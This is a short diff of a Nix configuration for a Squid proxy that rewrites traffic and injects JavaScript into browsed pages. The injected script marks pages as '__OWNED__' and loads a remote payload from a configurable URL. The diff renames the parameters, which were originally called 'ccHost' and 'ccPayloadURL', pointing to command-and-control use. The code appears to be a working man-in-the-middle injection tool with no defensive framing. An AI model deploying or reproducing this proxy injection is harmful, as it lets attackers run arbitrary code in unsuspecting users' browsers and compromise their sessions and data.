@@ -1,6 +1,6 @@
-{ ccHost, ccPayloadURL }:
+{ ignoreHosts, payloadUrl }:
 
-{ pkgs, ... }:
+{ pkgs, lib, ... }:
 
 let
 
@@ -36,7 +36,7 @@ let
     pid_filename /run/squid/pid
     cache_effective_user squid
 
-    url_rewrite_program ${pkgs.python35}/bin/python ${./rewrite.py} ${ccHost}
+    url_rewrite_program ${pkgs.python35}/bin/python ${./rewrite.py} ${lib.concatStringsSep " " ignoreHosts}
   '';
 
   injection = pkgs.stdenv.mkDerivation {
@@ -52,7 +52,7 @@ let
         window.__OWNED__ = true;
         function own() {
           var script = document.createElement('script');
-          script.setAttribute('src', '${ccPayloadURL}');
+          script.setAttribute('src', '${payloadUrl}');
           document.getElementsByTagName('html')[0].appendChild(script);
         }
         if (window.addEventListener) {
